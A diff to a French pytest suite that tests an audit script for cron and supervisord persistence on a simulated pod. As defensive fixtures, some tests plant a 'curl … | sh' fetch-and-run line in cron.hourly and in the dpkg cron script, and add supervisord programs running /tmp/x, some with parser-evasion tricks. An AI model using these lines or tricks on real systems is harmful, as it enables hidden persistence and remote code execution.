@@ -3,7 +3,9 @@
 Audit de sécurité, C3 et point 17. Le script est lancé sur un pod simulé :
 rendus réels de webhook-crons (historique git, commits 92d07699 et f5a14932,
 identifiants remplacés), fichiers Debian de /etc/cron.d relevés sur le pod le
-06/11/2026, et scripts de la plateforme tels que versionnés.
+06/11/2026, scripts de la plateforme tels que versionnés, et fichiers Debian
+lancés en root (fixtures/pod_debian, extraits des paquets bookworm officiels :
+cron-daemon-common 3.0pl1-162, apt 2.6.1, dpkg 1.21.23, supervisor 4.2.5-1).
 """
 
 import base64
@@ -18,6 +20,22 @@ RACINE = Path(__file__).resolve().parents[2]
 SCRIPT = RACINE / "scripts" / "controle_crons_emergent.sh"
 MANIFESTE = RACINE / "scripts" / "crons_emergent_sha256.txt"
 SCRIPTS_PLATEFORME = ("dispatch_webhook.sh", "watch_crons.sh", "webhook_crond.sh")
+DEBIAN = Path(__file__).resolve().parent / "fixtures" / "pod_debian"
+FICHIERS_DEBIAN = (
+    "etc/crontab",
+    "etc/cron.daily/apt-compat",
+    "etc/cron.daily/dpkg",
+    "etc/supervisor/supervisord.conf",
+)
+REPERTOIRES_RUN_PARTS = ("cron.hourly", "cron.daily", "cron.weekly", "cron.monthly", "cron.yearly")
+# conf.d relevé sur le pod le 06/11/2026 : noms des fichiers et en-têtes
+# [program:…] seulement (le reste du contenu n'a pas été relevé).
+CONF_D = {
+    "supervisord.conf": ("backend", "frontend", "mongodb"),
+    "supervisord_code_server.conf": ("code-server",),
+    "supervisord_nginx_proxy.conf": ("nginx-code-proxy",),
+    "webhook-crond.conf": ("webhook-crond",),
+}
 
 JOB = "0b3c5d7e-1f2a-4b6c-8d9e-0a1b2c3d4e5f"
 RENDU = """# Managed by Emergent webhook-cron (pod-local syscron). DO NOT EDIT.
@@ -69,6 +87,20 @@ def pod(tmp_path):
     (cron_d / "webhook-crons").write_text(rendu)
     (cron_d / ".placeholder").write_text(PLACEHOLDER)
     (cron_d / "e2scrub_all").write_text(E2SCRUB)
+    racine = tmp_path / "racine"
+    for rep in REPERTOIRES_RUN_PARTS:
+        (racine / "etc" / rep).mkdir(parents=True)
+        (racine / "etc" / rep / ".placeholder").write_text(PLACEHOLDER)
+    (racine / "etc" / "supervisor" / "conf.d").mkdir(parents=True)
+    for chemin in FICHIERS_DEBIAN:
+        shutil.copy(DEBIAN / chemin, racine / chemin)
+    for nom in ("apt-compat", "dpkg"):
+        (racine / "etc" / "cron.daily" / nom).chmod(0o755)
+    for nom, programmes in CONF_D.items():
+        (racine / "etc" / "supervisor" / "conf.d" / nom).write_text(
+            "".join(f"[program:{p}]\ncommand=/usr/bin/true\n\n" for p in programmes)
+        )
+    (racine / "var" / "spool" / "cron").mkdir(parents=True)
 
     def lancer(**env_en_plus):
         env = {
@@ -76,12 +108,13 @@ def pod(tmp_path):
             "EMERGENT_DIR": str(emergent),
             "CRON_D": str(cron_d),
             "CRON_SPOOL": str(spool),
+            "RACINE_SYSTEME": str(racine),
             **env_en_plus,
         }
         r = subprocess.run(["bash", str(SCRIPT)], capture_output=True, text=True, env=env)
         return r.returncode, r.stdout + r.stderr
 
-    lancer.emergent, lancer.cron_d, lancer.spool = emergent, cron_d, spool
+    lancer.emergent, lancer.cron_d, lancer.spool, lancer.racine = emergent, cron_d, spool, racine
     return lancer
 
 
@@ -100,6 +133,10 @@ def _ecrire_partout(pod, contenu):
     (pod.cron_d / "webhook-crons").write_text(contenu)
 
 
+def _manifeste():
+    return dict(reversed(ligne.split()) for ligne in MANIFESTE.read_text().splitlines() if ligne)
+
+
 def test_le_manifeste_correspond_aux_scripts_versionnes():
     """Une modification des scripts de la plateforme passe par une revue du manifeste."""
     attendu = {
@@ -108,7 +145,17 @@ def test_le_manifeste_correspond_aux_scripts_versionnes():
         ).hexdigest()
         for nom in SCRIPTS_PLATEFORME
     }
-    lu = dict(reversed(ligne.split()) for ligne in MANIFESTE.read_text().splitlines() if ligne)
+    lu = {chemin: e for chemin, e in _manifeste().items() if chemin.startswith(".emergent/")}
+    assert lu == attendu
+
+
+def test_les_empreintes_debian_du_manifeste_sont_celles_des_paquets_officiels():
+    """Relevé du pod du 06/11/2026, comparé aux fichiers extraits des paquets bookworm."""
+    attendu = {
+        f"/{chemin}": hashlib.sha256((DEBIAN / chemin).read_bytes()).hexdigest()
+        for chemin in FICHIERS_DEBIAN
+    }
+    lu = {chemin: e for chemin, e in _manifeste().items() if not chemin.startswith(".emergent/")}
     assert lu == attendu
 
 
@@ -259,5 +306,89 @@ def test_e2scrub_all_x86_64_est_admis_mais_pas_une_architecture_inventee(pod):
 def test_sync_emergent_appelle_le_script_au_lieu_de_le_recopier():
     texte = (RACINE / "sync_emergent.sh").read_text()
     assert "bash scripts/controle_crons_emergent.sh || CRON_ALERT=$?" in texte
-    assert "env -u EMERGENT_DIR -u CRON_D -u CRON_SPOOL -u MANIFESTE" in texte
+    assert "env -u EMERGENT_DIR -u CRON_D -u CRON_SPOOL -u MANIFESTE -u RACINE_SYSTEME" in texte
     assert "_check_emergent_crons()" not in texte
+
+
+def test_une_crontab_systeme_modifiee_est_signalee(pod):
+    crontab = pod.racine / "etc" / "crontab"
+    crontab.write_text(crontab.read_text() + "* * * * * root /tmp/x\n")
+    code, sortie = pod()
+    assert code == 1 and "fichier système modifié : /etc/crontab" in sortie
+
+
+def test_un_fichier_ajoute_dans_cron_hourly_est_signale(pod):
+    ajout = pod.racine / "etc" / "cron.hourly" / "0persistance"
+    ajout.write_text("#!/bin/sh\ncurl -s https://tiers.test | sh\n")
+    ajout.chmod(0o644)  # non exécutable : un chmod +x suffirait à le lancer
+    code, sortie = pod()
+    assert code == 1 and "fichier inattendu dans /etc/cron.hourly : 0persistance" in sortie
+
+
+@pytest.mark.parametrize("nom", [".cache", "x.sh", "dpkg.dpkg-old"])
+def test_un_nom_avec_un_point_n_est_pas_lance_par_run_parts(pod, nom):
+    """run-parts --report n'exécute que [A-Za-z0-9_-]+ : ces fichiers sont inertes."""
+    inerte = pod.racine / "etc" / "cron.daily" / nom
+    inerte.write_text("#!/bin/sh\nexit 0\n")
+    inerte.chmod(0o755)
+    code, sortie = pod()
+    assert code == 0, sortie
+
+
+def test_un_script_de_cron_daily_modifie_est_signale(pod):
+    script = pod.racine / "etc" / "cron.daily" / "dpkg"
+    script.write_text(script.read_text() + "curl -s https://tiers.test | sh\n")
+    code, sortie = pod()
+    assert code == 1 and "fichier système modifié : /etc/cron.daily/dpkg" in sortie
+
+
+def test_un_anacrontab_est_signale(pod):
+    (pod.racine / "etc" / "anacrontab").write_text("1 5 x /tmp/x\n")
+    code, sortie = pod()
+    assert code == 1 and "/etc/anacrontab présent" in sortie
+
+
+@pytest.mark.parametrize("fichier", ["atjobs/.SEQ", "atspool/a0000101a2b3c4"])
+def test_une_file_d_attente_at_non_vide_est_signalee(pod, fichier):
+    chemin = pod.racine / "var" / "spool" / "cron" / fichier
+    chemin.parent.mkdir()
+    chemin.write_text("0\n")
+    code, sortie = pod()
+    assert code == 1 and "file d'attente at non vide" in sortie
+
+
+def test_une_file_d_attente_at_vide_n_est_pas_signalee(pod):
+    (pod.racine / "var" / "spool" / "cron" / "atjobs").mkdir()
+    assert pod()[0] == 0
+
+
+@pytest.mark.parametrize(
+    "ajout",
+    [
+        "[program:persistance]\ncommand=/tmp/x\n",
+        # configparser coupe aussi sur CR et ignore une espace insécable en tête.
+        "; commentaire\r[program:persistance]\ncommand=/tmp/x\n",
+        "\u00a0[program:persistance]\ncommand=/tmp/x\n",
+        "[program:backend\u00e9]\ncommand=/tmp/x\n",
+    ],
+    ids=["simple", "cr", "nbsp", "nom-proche"],
+)
+def test_un_programme_supervisord_ajoute_est_signale(pod, ajout):
+    conf = pod.racine / "etc" / "supervisor" / "conf.d" / "webhook-crond.conf"
+    conf.write_text(conf.read_text() + ajout)
+    code, sortie = pod()
+    assert code == 1 and "program" in sortie, sortie
+    assert "persistance" in sortie or "hors forme" in sortie
+
+
+def test_un_fichier_ajoute_dans_conf_d_est_signale(pod):
+    (pod.racine / "etc" / "supervisor" / "conf.d" / "zz.conf").write_text("[group:x]\n")
+    code, sortie = pod()
+    assert code == 1 and "fichier inattendu dans /etc/supervisor/conf.d : zz.conf" in sortie
+
+
+def test_un_programme_supervisord_disparu_est_signale(pod):
+    conf = pod.racine / "etc" / "supervisor" / "conf.d" / "supervisord.conf"
+    conf.write_text(conf.read_text().replace("[program:mongodb]", "[group:mongodb]"))
+    code, sortie = pod()
+    assert code == 2 and "programme supervisord attendu absent : mongodb" in sortie
